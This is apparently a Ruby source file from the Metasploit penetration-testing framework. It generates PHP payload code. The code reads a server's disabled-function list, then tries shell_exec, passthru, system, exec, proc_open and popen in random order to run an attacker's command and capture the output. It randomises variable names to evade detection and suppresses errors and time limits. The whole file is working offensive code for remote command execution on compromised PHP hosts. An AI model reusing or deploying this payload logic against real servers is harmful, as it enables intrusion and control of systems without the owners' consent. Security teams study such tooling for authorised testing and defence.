# -*- coding: binary -*-
require 'msf/core'

###
#
###
module Msf::Payload::Php

  #
  # Generate a chunk of PHP code that should be eval'd before
  # #php_system_block.
  #
  # The generated code will initialize
  #
  # @option options [String] :disabled_varname PHP variable name in which to
  #   store an array of disabled functions.
  #
  # @return [String] A chunk of PHP code
  #
  def php_preamble(options = {})
    dis = options[:disabled_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
    dis = '$' + dis if (dis[0,1] != '$')

    @dis = dis

    # Canonicalize the list of disabled functions to facilitate choosing a
    # system-like function later.
    preamble = "/*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      #{dis}=@ini_get('disable_functions');
      if(!empty(#{dis})){
        #{dis}=preg_replace('/[, ]+/', ',', #{dis});
        #{dis}=explode(',', #{dis});
        #{dis}=array_map('trim', #{dis});
      }else{
        #{dis}=array();
      }
      "
    return preamble
  end

  #
  # Generate a chunk of PHP code that tries to run a command.
  #
  # @option options [String] :cmd_varname PHP variable name containing the
  #   command to run
  # @option options [String] :disabled_varname PHP variable name containing
  #   an array of disabled functions. See #php_preamble
  # @option options [String] :output_varname PHP variable name in which to
  #   store the output of the command. Will contain 0 if no exec functions
  #   work.
  #
  # @return [String] A chunk of PHP code that, with a little luck, will run a
  #   command.
  #
  def php_system_block(options = {})
    cmd = options[:cmd_varname] || '$cmd'
    dis = options[:disabled_varname] || @dis || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
    output = options[:output_varname] || '$' + Rex::Text.rand_text_alpha(rand(4) + 4)

    if (@dis.nil?)
      @dis = dis
    end

    cmd    = '$' + cmd if (cmd[0,1] != '$')
    dis    = '$' + dis if (dis[0,1] != '$')
    output = '$' + output if (output[0,1] != '$')

    is_callable = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
    in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)

    setup = "
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        #{cmd}=#{cmd}.\" 2>&1\\n\";
      }
      #{is_callable}='is_callable';
      #{in_array}='in_array';
      "
    shell_exec = "
      if(#{is_callable}('shell_exec')and!#{in_array}('shell_exec',#{dis})){
        #{output}=shell_exec(#{cmd});
      }else"
    passthru = "
      if(#{is_callable}('passthru')and!#{in_array}('passthru',#{dis})){
        ob_start();
        passthru(#{cmd});
        #{output}=ob_get_contents();
        ob_end_clean();
      }else"
    system = "
      if(#{is_callable}('system')and!#{in_array}('system',#{dis})){
        ob_start();
        system(#{cmd});
        #{output}=ob_get_contents();
        ob_end_clean();
      }else"
    exec = "
      if(#{is_callable}('exec')and!#{in_array}('exec',#{dis})){
        #{output}=array();
        exec(#{cmd},#{output});
        #{output}=join(chr(10),#{output}).chr(10);
      }else"
    proc_open = "
      if(#{is_callable}('proc_open')and!#{in_array}('proc_open',#{dis})){
        $handle=proc_open(#{cmd},array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        #{output}=NULL;
        while(!feof($pipes[1])){
          #{output}.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else"
    popen = "
      if(#{is_callable}('popen')and!#{in_array}('popen',#{dis})){
        $fp=popen(#{cmd},'r');
        #{output}=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            #{output}.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else"
    # Currently unused until we can figure out how to get output with COM
    # objects (which are not subject to safe mode restrictions) instead of
    # PHP functions.
    #win32_com = "
    #	if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
    #		$wscript = new COM('Wscript.Shell');
    #		$wscript->run(#{cmd} . ' > %TEMP%\\out.txt');
    #		#{output} = file_get_contents('%TEMP%\\out.txt');
    #	}else"
    fail_block = "
      {
        #{output}=0;
      }
    "

    exec_methods = [passthru, shell_exec, system, exec, proc_open, popen].sort_by { rand }
    buf = setup + exec_methods.join("") + fail_block
    #buf = Rex::Text.compress(buf)

    ###
    # All of this junk should go in an encoder
    #
    # Replace all single-quoted strings with quoteless equivalents, e.g.:
    #    echo('asdf');
    # becomes
    #    echo($a.$s.$d.$f);
    # and add "$a=chr(97);" et al to the top of the block
    #
    # Once this is complete, it is guaranteed that there are no spaces
    # inside strings.  This combined with the fact that there are no
    # function definitions, which require a space between the "function"
    # keyword and the name, means we can completely remove spaces.
    #
    #alpha_used = { 95 }
    #buf.gsub!(/'(.*?)'/) {
    #	str_array = []
    #	$1.each_byte { |c|
    #		if (('a'..'z').include?(c.chr))
    #			alpha_used[c] = 1
    #			str_array << "$#{c.chr}."
    #		else
    #			str_array << "chr(#{c})."
    #		end
    #	}
    #	str_array.last.chop!
    #	str_array.join("")
    #}
    #if (alpha_used.length > 1)
    #	alpha_used.each_key { |k| buf = "$#{k.chr}=chr(#{k});" + buf }
    #end
    #
    #buf.gsub!(/\s*/, '')
    #
    ###

    return buf

  end
end
